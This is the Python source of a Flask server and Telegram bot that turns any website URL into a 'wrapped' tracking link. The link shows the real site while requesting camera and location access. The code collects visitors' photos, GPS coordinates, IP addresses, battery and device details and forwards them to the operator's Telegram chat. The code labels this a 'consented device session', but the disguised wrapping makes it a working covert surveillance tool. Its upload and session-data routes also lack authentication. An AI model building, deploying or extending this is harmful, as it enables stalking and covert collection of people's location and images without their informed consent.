# server.py - Flask app with Telegram webhook (single-file deploy)
import os
import uuid
import base64
import json
import requests
from datetime import datetime
from dotenv import load_dotenv
from flask import Flask, request, send_from_directory, render_template, jsonify, url_for

from urllib.parse import urlparse

# load .env in development
load_dotenv()

# ---------- Configuration ----------
UPLOAD_DIR = "uploads"
SESSIONS_FILE = "sessions.json"
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")  # required
TELEGRAM_WEBHOOK_SECRET = os.environ.get(
    "TELEGRAM_WEBHOOK_SECRET",
    "webhook_" + (TELEGRAM_BOT_TOKEN or "no-token")[:8]
)

os.makedirs(UPLOAD_DIR, exist_ok=True)

# ---------- Flask app ----------
app = Flask(__name__, template_folder="templates", static_folder="static")

# ---------- Persistence helpers ----------
def load_sessions():
    try:
        with open(SESSIONS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}

def save_sessions(sessions):
    try:
        with open(SESSIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(sessions, f)
    except Exception as e:
        print("Failed to save sessions:", e)

SESSIONS = load_sessions()

# Simple in-memory chat state for Telegram conversations
# Key: str(chat_id), Value: {"awaiting_url": bool}
CHAT_STATE = {}

# ---------- Small helpers ----------
def telegram_api(method: str, data=None, files=None, timeout=30):
    if not TELEGRAM_BOT_TOKEN:
        return None, "no_token"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/{method}"
    try:
        if files is None:
            r = requests.post(url, json=data or {}, timeout=timeout)
        else:
            r = requests.post(url, data=data or {}, files=files or {}, timeout=timeout)
        return r, None
    except Exception as e:
        return None, str(e)

def tg_send_text(chat_id: str, text: str):
    if not TELEGRAM_BOT_TOKEN or not chat_id:
        return False
    payload = {"chat_id": str(chat_id), "text": text}
    r, _ = telegram_api("sendMessage", data=payload)
    return bool(r and r.ok)

def tg_send_photo(chat_id: str, photo_path: str, caption: str = None):
    if not TELEGRAM_BOT_TOKEN or not chat_id:
        return False
    try:
        with open(photo_path, "rb") as f:
            files = {"photo": f}
            data = {"chat_id": str(chat_id)}
            if caption:
                data["caption"] = caption
            r, _ = telegram_api("sendPhoto", data=data, files=files)
            return bool(r and r.ok)
    except Exception:
        return False

def is_valid_http_url(u: str):
    try:
        p = urlparse(u)
        return p.scheme in ("http", "https") and bool(p.netloc)
    except Exception:
        return False

def normalize_url_for_wrap(text: str):
    if not text:
        return None
    u = text.strip()
    if not u:
        return None
    p = urlparse(u)
    if not p.scheme:
        u = "https://" + u
        p = urlparse(u)
    if p.scheme not in ("http", "https") or not p.netloc:
        return None
    return u

def format_battery(bat):
    if not bat:
        return "unknown"
    try:
        level = bat.get("level")
        charging = bat.get("charging")
        if isinstance(level, (int, float)):
            if level <= 1:
                pct = round(level * 100)
            else:
                pct = round(level)
            return f"{pct}%{' (charging)' if charging else ''}"
        return str(bat)
    except Exception:
        return str(bat)

def format_coords(coords):
    if not coords:
        return "unknown"
    try:
        lat = coords.get("lat")
        lon = coords.get("lon")
        acc = coords.get("acc") or coords.get("accuracy")
        if lat is None or lon is None:
            return str(coords)
        if acc is not None:
            return f"{lat},{lon} (±{acc} m)"
        return f"{lat},{lon}"
    except Exception:
        return str(coords)

# ---------- Endpoints ----------
@app.route("/")
def index():
    return ("Flask server for consented device session. Use the Telegram bot to create sessions.", 200)

# Plain session creation (no embedded site) - kept for compatibility
@app.route("/create", methods=["POST"])
def create_session():
    data = request.get_json(silent=True) or {}
    label = data.get("label", "")
    chat_id = data.get("chat_id")
    token = uuid.uuid4().hex
    SESSIONS[token] = {
        "label": label,
        "created_at": datetime.utcnow().isoformat(),
        "visits": [],
        "chat_id": chat_id
    }
    save_sessions(SESSIONS)
    link = url_for("session_page", token=token, _external=True)
    if chat_id:
        tg_send_text(
            chat_id,
            f"Plain session created\n"
            f"Token: {token}\n"
            f"Link: {link}"
        )
    return jsonify({"token": token, "link": link})

@app.route("/s/<token>")
def session_page(token):
    if token not in SESSIONS:
        return "Invalid token", 404
    try:
        return render_template("session.html", token=token)
    except Exception:
        return f"Session page for {token}", 200

# Wrapped session (site + tracker)
@app.route("/wrap_create", methods=["POST"])
def wrap_create():
    data = request.get_json(silent=True) or {}
    target_url = data.get("target_url", "").strip()

    if not is_valid_http_url(target_url):
        return jsonify({"error": "invalid_url"}), 400

    label = data.get("label", "")
    chat_id = data.get("chat_id")
    token = uuid.uuid4().hex
    SESSIONS[token] = {
        "label": label,
        "created_at": datetime.utcnow().isoformat(),
        "visits": [],
        "chat_id": chat_id,
        "target_url": target_url,
        "wrap": True
    }
    save_sessions(SESSIONS)
    link = url_for("wrapper_page", token=token, _external=True)
    if chat_id:
        # Keep this message very short and clean
        tg_send_text(
            chat_id,
            "Wrapped session created\n"
            f"Site: {target_url}\n"
            f"Link: {link}"
        )
    return jsonify({"token": token, "link": link})

@app.route("/w/<token>")
def wrapper_page(token):
    if token not in SESSIONS:
        return "Invalid token", 404
    target = SESSIONS[token].get("target_url", "")
    try:
        return render_template("wrapper.html", token=token, target_url=target)
    except Exception:
        return f"Wrapper page for {token} -> {target}", 200

# Upload endpoints
@app.route("/upload_info/<token>", methods=["POST"])
def upload_info(token):
    if token not in SESSIONS:
        return "Invalid token", 404

    payload = request.get_json(silent=True) or {}
    battery = payload.get("battery")
    coords = payload.get("coords")
    details = payload.get("details")  # full extra data bundle

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    timestamp = datetime.utcnow().isoformat()

    entry = {
        "timestamp": timestamp,
        "ip": ip,
        "battery": battery,
        "coords": coords,
        "details": details,
    }

    SESSIONS[token]["visits"].append(entry)
    save_sessions(SESSIONS)

    # -------- Telegram notification formatting --------
    chat_id = SESSIONS[token].get("chat_id")
    if chat_id:
        # battery
        if battery and isinstance(battery, dict):
            bat_txt = f"{round(battery.get('level'))}%{' (charging)' if battery.get('charging') else ''}"
        else:
            bat_txt = "unknown"

        # coords
        if coords and isinstance(coords, dict):
            loc_txt = f"{coords.get('lat')},{coords.get('lon')} (±{coords.get('acc') or coords.get('accuracy','?')} m)"
        else:
            loc_txt = "unknown"

        # extra details
        d = details or {}
        ua = d.get("userAgent", "")
        ram = d.get("ramGB")
        cpu = d.get("cpuCores")
        scr = d.get("screen") or {}
        net = d.get("network") or {}

        msg = (
            f"📡 Session {token} — INFO\n"
            f"⏱ Time: {timestamp}\n"
            f"🌍 IP: {ip}\n"
            f"🔋 Battery: {bat_txt}\n"
            f"📍 Location: {loc_txt}\n"
            f"📱 Device: {ua[:80] + ('…' if len(ua) > 80 else '')}\n"
            f"💾 RAM: {ram} GB   ⚙ CPU: {cpu} cores\n"
            f"🖥 Screen: {scr.get('w')}×{scr.get('h')} ({scr.get('ratio')}x)\n"
            f"📶 Network: {net.get('type','?')} {net.get('downlink','?')}Mbps"
        )
        tg_send_text(chat_id, msg)

    return jsonify({"status": "ok", "stored": entry})


@app.route("/upload_image/<token>", methods=["POST"])
def upload_image(token):
    """
    Accepts JSON body:
      {
        "image_b64": "data:image/jpeg;base64,...",
        "coords": {"lat":..., "lon":..., "accuracy" or "acc":...}  (optional),
        "battery": {"level":..., "charging":...}                    (optional)
      }
    """
    if token not in SESSIONS:
        return "Invalid token", 404

    data = request.get_json(silent=True) or {}
    b64 = data.get("image_b64", "")
    coords = data.get("coords")
    battery = data.get("battery")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    if not b64:
        return ("No image data", 400)
    if b64.startswith("data:"):
        try:
            b64 = b64.split(",", 1)[1]
        except Exception:
            return ("Bad data url", 400)
    try:
        imgbytes = base64.b64decode(b64)
    except Exception:
        return ("Bad base64", 400)

    if len(imgbytes) > 10_000_000:
        return ("Image too large", 413)

    timestamp = datetime.utcnow().strftime("%Y%m%dT%H%M%S%f")
    fname = f"{token}_{timestamp}.jpg"
    path = os.path.join(UPLOAD_DIR, fname)
    try:
        with open(path, "wb") as f:
            f.write(imgbytes)
    except Exception as e:
        print("Failed to write image:", e)
        return ("Server error saving image", 500)

    sess = SESSIONS[token]
    sess.setdefault("files", []).append(fname)
    meta = {
        "timestamp": timestamp,
        "filename": fname,
        "ip": ip,
    }
    if coords:
        meta["coords"] = coords
    if battery:
        meta["battery"] = battery
    sess.setdefault("images_meta", []).append(meta)
    save_sessions(SESSIONS)

    chat_id = sess.get("chat_id")
    if chat_id:
        bat_txt = format_battery(battery)
        coords_txt = format_coords(coords)
        caption_lines = [
            f"Session {token} (photo)",
            f"Time: {timestamp}",
            f"IP: {ip}",
            f"Battery: {bat_txt}",
            f"Coords: {coords_txt}",
        ]
        caption = "\n".join(caption_lines)
        sent = tg_send_photo(chat_id, path, caption=caption)
        if not sent:
            try:
                downloads_url = url_for("serve_upload", filename=fname, _external=True)
                tg_send_text(chat_id, f"Image saved: {downloads_url}\n{caption}")
            except Exception:
                pass

    return jsonify({"status": "saved", "filename": fname, "meta": meta})

@app.route("/session_data/<token>")
def session_data(token):
    if token not in SESSIONS:
        return "Invalid token", 404
    return jsonify(SESSIONS[token])

@app.route("/uploads/<filename>")
def serve_upload(filename):
    return send_from_directory(UPLOAD_DIR, filename)

# ---------- Telegram webhook ----------
@app.route(f"/telegram/{TELEGRAM_WEBHOOK_SECRET}", methods=["POST"])
def telegram_webhook():
    if not TELEGRAM_BOT_TOKEN:
        return "no token", 403
    update = request.get_json(silent=True)
    if not update:
        return "no json", 400

    try:
        msg = update.get("message") or update.get("edited_message") or {}
        if not msg:
            return "ok", 200

        chat = msg.get("chat", {})
        chat_id = chat.get("id")
        chat_key = str(chat_id) if chat_id is not None else None
        text = (msg.get("text") or "").strip()
        if not text or chat_key is None:
            return "ok", 200

        state = CHAT_STATE.get(chat_key, {"awaiting_url": False})

        # /cancel
        if text.lower().startswith("/cancel"):
            state["awaiting_url"] = False
            CHAT_STATE[chat_key] = state
            tg_send_text(chat_id, "Cancelled.\nUse /start to begin again.")
            return "ok", 200

        # /start -> ask for site
        if text.lower().startswith("/start"):
            state["awaiting_url"] = True
            CHAT_STATE[chat_key] = state
            tg_send_text(
                chat_id,
                "Send the website you want to embed.\n"
                "Examples:\n"
                "  example.com\n"
                "  https://unstop.com\n\n"
                "I will reply with a single link that opens that site\n"
                "and asks for camera/location in a popup."
            )
            return "ok", 200

        # /create <label> (optional plain session)
        if text.lower().startswith("/create"):
            parts = text.split(maxsplit=1)
            label = parts[1] if len(parts) > 1 else ""
            try:
                r = requests.post(
                    url_for("create_session", _external=True),
                    json={"label": label, "chat_id": str(chat_id)},
                    timeout=5
                )
                if r.ok:
                    data = r.json()
                    tg_send_text(
                        chat_id,
                        "Plain session created\n"
                        f"Token: {data['token']}\n"
                        f"Link: {data['link']}"
                    )
                else:
                    tg_send_text(chat_id, f"Failed to create session: {r.status_code}")
            except Exception as e:
                print("create command error:", e)
                tg_send_text(chat_id, "Server error while creating session.")
            return "ok", 200

        # /status <token>
        if text.lower().startswith("/status"):
            parts = text.split(maxsplit=1)
            if len(parts) < 2:
                tg_send_text(chat_id, "Usage: /status <token>")
                return "ok", 200
            token = parts[1].strip()
            try:
                r = requests.get(url_for("session_data", token=token, _external=True), timeout=5)
                if r.status_code != 200:
                    tg_send_text(chat_id, f"Server returned {r.status_code}: {r.text}")
                    return "ok", 200
                data = r.json()
                visits = data.get("visits", [])
                summary = (
                    f"Session {token}\n"
                    f"Label: {data.get('label')}\n"
                    f"Created: {data.get('created_at')}\n"
                    f"Total events: {len(visits)}"
                )
                tg_send_text(chat_id, summary)
                for v in visits[-5:]:
                    bat_txt = format_battery(v.get("battery"))
                    coords_txt = format_coords(v.get("coords"))
                    ua = v.get("user_agent") or ""
                    ua_short = (ua[:180] + "...") if len(ua) > 180 else ua
                    lines = [
                        f"Time: {v.get('timestamp')}",
                        f"IP: {v.get('ip')}",
                        f"Battery: {bat_txt}",
                        f"Coords: {coords_txt}",
                    ]
                    if ua_short:
                        lines.append(f"Device: {ua_short}")
                    tg_send_text(chat_id, "\n".join(lines))
            except Exception as e:
                print("status command error:", e)
                tg_send_text(chat_id, f"Failed to fetch status: {e}")
            return "ok", 200

        # Awaiting a site URL after /start
        if state.get("awaiting_url"):
            candidate = text.strip()
            url = normalize_url_for_wrap(candidate)
            if not url:
                tg_send_text(
                    chat_id,
                    "That doesn't look like a valid site.\n"
                    "Send something like: example.com or https://example.com\n"
                    "Or /cancel to stop."
                )
                return "ok", 200

            try:
                r = requests.post(
                    url_for("wrap_create", _external=True),
                    json={"target_url": url, "label": "", "chat_id": str(chat_id)},
                    timeout=5
                )
                if r.ok:
                    data = r.json()
                    state["awaiting_url"] = False
                    CHAT_STATE[chat_key] = state
                    tg_send_text(
                        chat_id,
                        "Wrapped link ready\n"
                        f"Site: {url}\n"
                        f"Link: {data['link']}"
                    )
                else:
                    tg_send_text(chat_id, f"Failed to create wrapped session: {r.status_code}")
            except Exception as e:
                print("wrap_create error:", e)
                tg_send_text(chat_id, "Server error while creating wrapped session.")
            return "ok", 200

        # Fallback
        tg_send_text(
            chat_id,
            "Commands:\n"
            "/start  – create embedded tracking link for a site\n"
            "/status <token> – show session info\n"
            "/create <label> – plain session (no site)\n"
            "/cancel – cancel current flow"
        )
        return "ok", 200

    except Exception as e:
        print("Telegram webhook error:", e)

    return "ok", 200

# ---------- Run ----------
if __name__ == "__main__":
  debug_mode = os.environ.get("FLASK_DEBUG", "0") in ("1", "true", "True")
  port = int(os.environ.get("PORT", 5000))
  app.run(host="0.0.0.0", port=port, debug=debug_mode)
